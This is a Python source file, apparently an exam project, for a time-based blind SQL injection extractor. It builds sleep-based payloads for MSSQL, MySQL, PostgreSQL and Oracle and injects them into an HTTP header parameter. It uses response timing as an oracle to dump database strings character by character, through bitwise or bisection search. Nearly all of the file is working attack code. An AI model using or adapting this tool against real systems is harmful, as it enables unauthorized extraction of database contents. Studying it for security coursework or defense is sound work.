import os
import json
import requests
import sys
import time
from data_classes import Settings, ExtractedData


class BlindSQLIExtractorBase:
    settings: Settings
    extracted_data: ExtractedData
    data_file_name: str = "sqli_data.json"


    def __init__(self):
        self.settings = Settings()
        self.extracted_data = ExtractedData()

    def set_delay(self, delay: int):
        self.settings.delay = delay
    def set_url(self, url: str):
        normalized_url = url.strip()
        if not normalized_url.startswith(("http://", "https://")):
            normalized_url = f"http://{normalized_url}"
        self.settings.url = normalized_url
    def set_sql_type(self, sql_type: str):
        if sql_type.upper() in ["MSSQL", "MYSQL", "POSTGRESQL", "ORACLE"]:
            self.settings.sql_type = sql_type.upper()
        else:
            print("SQL_TYPE non valido. Valori accettati: MSSQL, MYSQL, POSTGRESQL, ORACLE")
            return
    def set_post_parameters(self, post_query: str):
        self.settings.post_parameters = post_query
    def set_get_parameters(self, get_query: str):
        self.settings.get_parameters = get_query
    def set_header_parameters(self, header: object):
        parameters = header.strip().split(":", 1)
        if len(parameters) != 2:
            print("Errore: il formato dell'header non è valido. Il formato corretto è 'Header-Name: Header-Value'.")
            return
        
        self.settings.header_parameters[parameters[0]] = parameters[1].strip()
    def set_parameter_target(self, parameter: str):
        if not self.settings.header_parameters:
            print(
                "Errore: è necessario impostare prima un header target (funzione set_header_parameters() o add_header_parameters())"
            )
            return

        parameter = parameter.strip()
        if not parameter:
            print("Errore: il nome del parametro target non può essere vuoto.")
            return

        parameter_found = False
        for value in self.settings.header_parameters.values():
            if isinstance(value, str) and parameter in value:
                parameter_found = True
                break

        if not parameter_found:
            print(
                f"Errore: il parametro '{parameter}' non è presente nei valori dell'header target. Header fornito: {self.settings.header_parameters}"
            )
            return

        self.settings.parameter_target = parameter
    def set_verbose(self, verbose: bool):
        self.settings.verbose = verbose
    def set_optimizer(self, optimizer: str):
        if optimizer.lower() in ["anding", "bisection"]:
            self.settings.optimizer = optimizer.lower()
        else:
            print("Optimizer non valido. Valori accettati: anding, bisection")
            return
    def set_delimiter(self, delimiter: str):
        self.settings.delimiter = delimiter
    def set_request_timeout(self, request_timeout: int):
        if request_timeout <= 0:
            print("request_timeout non valido. Deve essere > 0")
            return
        self.settings.request_timeout = request_timeout
    def set_max_retries(self, max_retries: int):
        if max_retries <= 0:
            print("max_retries non valido. Deve essere > 0")
            return
        self.settings.max_retries = max_retries
    def set_retry_delay(self, retry_delay: float):
        if retry_delay < 0:
            print("retry_delay non valido. Deve essere >= 0")
            return
        self.settings.retry_delay = retry_delay

    def add_header_parameters(self, header: object):
        if not self.settings.header_parameters:
            self.settings.header_parameters = header
        else:
            self.settings.header_parameters = {**self.settings.header_parameters, **header}

    def is_really_time_based_injection(self):
        return self.oracle("1=1")

    def internal_check_target(self):
        if not self.settings.post_parameters and not self.settings.get_parameters and not self.settings.header_parameters:
            print(
                "Errore: è necessario impostare almeno un target (funzione set_post_parameters(), set_get_parameters() o set_header_parameters()) per definire automaticamente il tipo di SQL Injection"
            )
            return False
        return True

    def encode_query(self, q):
        encoded_query = requests.utils.quote(q, safe="")
        if self.settings.verbose:
            print(f"\r\nEncoded query: {encoded_query}\r\n")
        return encoded_query

    def get_delayed_query(self, q):
        if "MSSQL" == self.settings.sql_type:
            query = f"';IF({q}) WAITFOR DELAY '0:0:{self.settings.delay}'--"
        elif "MYSQL" == self.settings.sql_type:
            query = f"';IF({q}) THEN SLEEP({self.settings.delay})--"
        elif "POSTGRESQL" == self.settings.sql_type:
            query = f"';IF({q}) THEN PG_SLEEP({self.settings.delay})--"
        elif "ORACLE" == self.settings.sql_type:
            query = f"';IF({q}) THEN DBMS_LOCK.SLEEP({self.settings.delay})--"
        else:
            query = ""

        return query
    # Not developed because out of exam scope
    def get_encoded_post_query(self, q):
        print("WARNING - Injection with POST parameter not developed because out of exam scope")
        return
    # Not developed because out of exam scope
    def get_encoded_get_query(self, q):
        print("WARNING - Injection with GET parameter not developed because out of exam scope")
        return
    def get_encoded_header_query(self, q):
        if not self.settings.parameter_target:
            print(
                "Errore: è necessario impostare prima un header parameter target (funzione set_parameter_target())"
            )
            return None

        injected = False
        delayed_query = self.get_delayed_query(q)
        if self.settings.verbose:
            print(f"\r\nDelayed query: {delayed_query}")
        injected_header = dict(self.settings.header_parameters)

        for header, value in self.settings.header_parameters.items():
            if not isinstance(value, str):
                continue

            parameters = value.split(self.settings.delimiter)
            for i, param in enumerate(parameters):
                param_name = param.strip().split("=", 1)[0].strip()
                if param_name != self.settings.parameter_target:
                    continue

                parameters[i] = param + self.encode_query(delayed_query)
                injected_header[header] = self.settings.delimiter.join(parameters)
                injected = True
                break

            if injected:
                break

        if not injected:
            print(
                f"Errore: non è stato possibile iniettare la query nell'header. Verificare che il parametro '{self.settings.parameter_target}' sia presente in uno dei valori dell'header target e che il delimitatore '{self.settings.delimiter}' sia corretto."
            )
            return None

        if self.settings.verbose:
            print(f"Injected headers: {injected_header}")

        return injected_header

    def oracle(self, q):
        if not self.internal_check_target():
            return
        if not self.settings.sql_type:
            self.define_sql_type()

        print('.', end="", flush=True)
        sys.stdout.flush()

        timeout = max(self.settings.request_timeout, self.settings.delay + 5)
        max_attempts = self.settings.max_retries
        last_exception = None

        for attempt in range(1, max_attempts + 1):
            try:
                start = time.monotonic()
                if self.settings.post_parameters:
                    data = self.get_encoded_post_query(q)
                    if not data:
                        return None

                    r = requests.post(
                        self.settings.url,
                        data=data,
                        headers=self.settings.header_parameters,
                        timeout=timeout,
                        stream=True,
                    )
                else:
                    if self.settings.get_parameters:
                        url = self.get_encoded_get_query(q)
                        if not url:
                            return None

                        r = requests.get(
                            url,
                            headers=self.settings.header_parameters,
                            timeout=timeout,
                            stream=True,
                        )
                    else:
                        injected_and_encoded_headers = self.get_encoded_header_query(q)
                        if not injected_and_encoded_headers:
                            return None

                        r = requests.get(
                            self.settings.url,
                            headers=injected_and_encoded_headers,
                            timeout=timeout,
                            stream=True,
                        )

                elapsed = time.monotonic() - start
                r.close()

                if self.settings.verbose:
                    print(f"{r} ({elapsed:.2f}s) [tentativo {attempt}/{max_attempts}]", end="\r\n", flush=True)
                    sys.stdout.flush()

                return elapsed >= self.settings.delay

            except requests.exceptions.RequestException as exc:
                last_exception = exc
                if self.settings.verbose:
                    print(
                        f"\r\nErrore request (tentativo {attempt}/{max_attempts}): {exc}",
                        end="\r\n",
                        flush=True,
                    )

                if attempt < max_attempts and self.settings.retry_delay > 0:
                    time.sleep(self.settings.retry_delay)

            finally:
                time.sleep(0.5)

        print(f"\r\nErrore: richiesta fallita dopo {max_attempts} tentativi. Ultimo errore: {last_exception}")
        return None

    def dump_length(self, q):
        length = 0
        for p in range(7):
            bit_is_true = self.oracle(f"({q})&{2**p}>0")
            if bit_is_true is None:
                return None

            if bit_is_true:
                length |= 2**p

        return length
    def dump_string_anding(self, q, length):
        val = ""
        for i in range(1, length + 1):
            c = 0
            for p in range(7):
                bit_is_true = self.oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0")
                if bit_is_true is None:
                    return None

                if bit_is_true:
                    c |= 2**p

            print(chr(c), end="", flush=True)
            sys.stdout.flush()
            val += chr(c)

        print("\r\n")
        return val
    def dump_string_bisection(self, q, length):
        val = ""
        for i in range(1, length + 1):
            low = 0
            high = 127
            while low <= high:
                mid = (low + high) // 2
                is_in_range = self.oracle(f"ASCII(SUBSTRING(({q}),{i},1)) BETWEEN {low} AND {mid}")
                if is_in_range is None:
                    return None

                if is_in_range:
                    high = mid - 1
                else:
                    low = mid + 1
            print(chr(low), end="", flush=True)
            sys.stdout.flush()
            val += chr(low)
        print("\r\n")
        return val

    def check_saved_settings(self):
        return os.path.isfile(self.data_file_name)

    def _merge_settings_with_defaults(self, saved_settings):
        default_settings = Settings()
        merged_settings = dict(default_settings.__dict__)

        if isinstance(saved_settings, Settings):
            saved_settings = saved_settings.__dict__

        if not isinstance(saved_settings, dict):
            raise TypeError("saved_settings deve essere un dict o un'istanza di Settings")

        for key, value in saved_settings.items():
            if key not in merged_settings:
                continue
            merged_settings[key] = value

        if not isinstance(merged_settings.get("header_parameters"), dict):
            merged_settings["header_parameters"] = {}

        return Settings(**merged_settings)
    
    def load_saved_data(self):
        if not self.check_saved_settings():
            print("Non sono state trovate impostazioni salvate.")
            return None

        try:
            with open(self.data_file_name, "r") as f:
                data = json.load(f)

                return data
            
        except Exception as e:
            print(f"Errore durante il caricamento delle impostazioni: {e}")
            return None
        
    def restore_saved_settings(self, saved_settings: Settings):
        try:
            self.settings = self._merge_settings_with_defaults(saved_settings)
            return self.settings
        except Exception as e:
            print(f"Errore durante il ripristino delle impostazioni: {e}")
            return None
        
    def restore_extracted_data(self, saved_data: dict):
        try:
            if "extracted_data" in saved_data:
                self.extracted_data = ExtractedData(**saved_data["extracted_data"])
        except Exception as e:
            print(f"Errore durante il ripristino dei dati: {e}")
            return None

    def save_extracted_data(self):
        data_to_save = {
            "settings": self.settings.__dict__,
            "extracted_data": self.extracted_data.__dict__,
        }
        try:
            with open(self.data_file_name, "w") as f:
                json.dump(data_to_save, f, indent=4)
        except Exception as e:
            print(f"Errore durante il salvataggio dei dati: {e}")
